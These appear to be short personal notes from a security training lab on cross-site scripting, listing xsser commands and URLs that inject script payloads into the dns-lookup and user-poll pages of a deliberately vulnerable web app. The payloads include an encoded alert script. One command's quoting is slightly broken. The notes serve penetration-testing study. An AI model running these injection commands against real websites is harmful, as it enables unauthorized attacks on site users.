

- http://192.94.37.3/index.php?page=dns-lookup.php
- xsser
- xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
- xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
- xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "PUT YOUR  ALERT COMMAND"

we can copy and paste payload in burp repeater 

http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=jd&user-poll-php-submit-button=Submit+Vote


- xsser --url “http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote”

- xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-po ll-php-submit-button=Submit+Vote" --Fp ""'

- http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281 %29%3C%2Fscript%3E&initials=jd&user-poll-php-submit-button=Submit+Vote



https://assets.ine.com/labs/ad-manuals/walkthrough-1889.pdf